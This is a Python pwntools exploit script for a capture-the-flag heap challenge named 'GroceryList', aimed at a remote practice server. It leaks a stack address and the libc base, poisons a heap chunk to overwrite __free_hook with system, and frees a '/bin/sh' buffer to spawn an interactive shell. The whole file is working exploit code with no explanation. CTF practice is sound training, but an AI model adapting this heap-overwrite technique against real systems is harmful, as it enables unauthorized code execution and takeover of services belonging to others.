import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='GroceryList'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.27")
pdbg.remote('node3.buuoj.cn',26507)
# pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			io=pdbg.run("debug")
			# io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def show():
			io.sendlineafter('Exit','1')

		def add(sele,name):
			io.sendlineafter('Exit','2')
			io.sendlineafter('?',str(sele))
			io.sendlineafter(':',name)

		def empadd(sele,man):
			io.sendlineafter('Exit','3')
			io.sendlineafter('?',str(sele))
			io.sendlineafter('?',str(man))

		def delete(idx):
			io.sendlineafter('Exit','4')
			io.sendlineafter('?',str(idx))

		def edit(idx,name):
			io.sendlineafter('Exit','5')
			io.sendlineafter('?',str(idx))
			io.sendlineafter(':',name)

		def Tadd():
			io.sendlineafter('Exit','6')

		add(2,'\x11'*4)#0
		add(2,'\x12'*4)#1
		Tadd()#2
		add(2,'\x09'*9)#3
		#Tadd()
		show()
		stack_addr=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-11
		log.success('stack_addr: '+hex(stack_addr))
		delete(3)
		payload=p64(0)*3+p64(0x41)+p64(stack_addr)
		edit(2,payload)
		add(2,'doudou')
		empadd(2,1)
		#Tadd()
		#delete(2)
		#show()
		show()
		libcbase=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-231-libc.sym['__libc_start_main']
		log.success('libcbase: '+hex(libcbase))
		free_hook=libcbase+libc.sym['__free_hook']
		system=libcbase+libc.sym['system']
		add(3,'doudou')
		delete(5)
		payload=p64(0)*7+p64(0x71)+p64(free_hook)
		edit(3,payload)
		add(3,'/bin/sh\x00')
		add(3,p64(system))
		delete(5)
		io.interactive()


		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# pdbg.bp([])
		# io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue